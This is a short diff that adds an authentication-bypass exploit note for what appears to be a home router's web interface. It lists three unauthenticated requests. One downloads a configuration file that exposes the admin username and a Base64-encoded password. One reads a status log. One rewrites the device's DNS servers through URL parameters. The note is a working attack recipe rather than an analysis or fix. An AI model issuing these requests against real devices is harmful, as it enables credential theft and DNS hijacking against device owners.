@@ -1,0 +1,18 @@
+Authentication-bypass:
+
+1) http://www.example.com/config.bin
+ 
+===<snip>====
+<sysUserName value="admin"/>
+<zipb enable="1"/>
+<dns dynamic="disable" primary="1.1.1.1" secondary="2.2.2.3" domain="Home"
+host="alpha"/>
+<sysPassword value="dGVzdA=="/>
+===<snip>====
+ 
+=> sysPassword is Base64 encoded
+
+2) http://www.example.com/status/status_log.sys
+
+3) http://www.example.com/advanced/adv_dns.xgi?&SET/dns/mode=0&SET/dns/mode/server/primarydns=1.1.1.1&SET/dns/mode/server/secondarydns=2.2.2.2
+
